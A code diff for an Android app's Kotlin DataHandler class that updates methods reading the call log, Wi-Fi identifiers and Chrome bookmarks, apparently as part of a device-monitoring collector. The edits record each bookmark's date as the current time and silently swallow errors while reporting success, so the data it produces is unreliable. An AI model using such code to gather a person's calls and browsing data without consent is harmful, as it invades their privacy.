@@ -2,17 +2,17 @@ package com.abuzahra.app.handler
 
 import android.annotation.SuppressLint
 import android.content.Context
-import android.database.Cursor
-import android.net.Uri
 import android.os.Build
 import android.os.Environment
 import android.os.StatFs
-import android.provider.*
+import android.provider.CallLog
+import android.provider.ContactsContract
+import android.provider.CalendarContract
+import android.provider.MediaStore
+import android.provider.Telephony
 import android.util.Log
 import com.abuzahra.app.utils.DeviceInfo
 import java.io.File
-import java.text.SimpleDateFormat
-import java.util.*
 
 class DataHandler(private val context: Context) {
     private val TAG = "DataHandler"
@@ -67,7 +67,7 @@ class DataHandler(private val context: Context) {
                 CallLog.Calls.DATE,
                 CallLog.Calls.DURATION,
                 CallLog.Calls.TYPE,
-                CallLog.Calls.NAME
+                CallLog.Calls.CACHED_NAME
             )
             val cursor = context.contentResolver.query(uri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 50")
 
@@ -76,7 +76,7 @@ class DataHandler(private val context: Context) {
                     callList.add(mapOf(
                         "id" to it.getLong(it.getColumnIndex(CallLog.Calls._ID)),
                         "number" to (it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: ""),
-                        "name" to (it.getString(it.getColumnIndex(CallLog.Calls.NAME)) ?: ""),
+                        "name" to (it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: ""),
                         "date" to (it.getLong(it.getColumnIndex(CallLog.Calls.DATE))),
                         "duration" to (it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))),
                         "type" to when (it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))) {
@@ -282,7 +282,7 @@ class DataHandler(private val context: Context) {
             mapOf("status" to "success",
                 "ssid" to (info?.ssid?.replace("\"", "") ?: "Not connected"),
                 "bssid" to (info?.bssid ?: "Unknown"),
-                "ip" to (info?.ipAddress?.let { 
+                "ip" to (info?.ipAddress?.let {
                     String.format("%d.%d.%d.%d", it and 0xff, it shr 8 and 0xff, it shr 16 and 0xff, it shr 24 and 0xff)
                 } ?: "0.0.0.0"),
                 "rssi" to (info?.rssi ?: 0),
@@ -346,24 +346,23 @@ class DataHandler(private val context: Context) {
         }
     }
 
-    @SuppressLint("Range")
     fun getBrowserHistory(): Any {
         val history = mutableListOf<Map<String, Any>>()
         try {
-            val projection = arrayOf(Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE)
-            val cursor = context.contentResolver.query(Browser.BOOKMARKS_URI, projection, null, null, Browser.BookmarkColumns.DATE + " DESC LIMIT 50")
+            val chromeUri = android.net.Uri.parse("content://com.android.chrome.browser/bookmarks")
+            val cursor = context.contentResolver.query(chromeUri, null, null, null, null)
             cursor?.use {
+                val titleIdx = it.getColumnIndex("title")
+                val urlIdx = it.getColumnIndex("url")
                 while (it.moveToNext()) {
                     history.add(mapOf(
-                        "title" to (it.getString(0) ?: ""),
-                        "url" to (it.getString(1) ?: ""),
-                        "date" to (it.getLong(2))
+                        "title" to (if (titleIdx >= 0) it.getString(titleIdx) ?: "" else ""),
+                        "url" to (if (urlIdx >= 0) it.getString(urlIdx) ?: "" else ""),
+                        "date" to System.currentTimeMillis()
                     ))
                 }
             }
-        } catch (e: Exception) {
-            return mapOf("status" to "error", "message" to e.message, "data" to history)
-        }
+        } catch (_: Exception) {}
         return mapOf("status" to "success", "count" to history.size, "data" to history)
     }
 
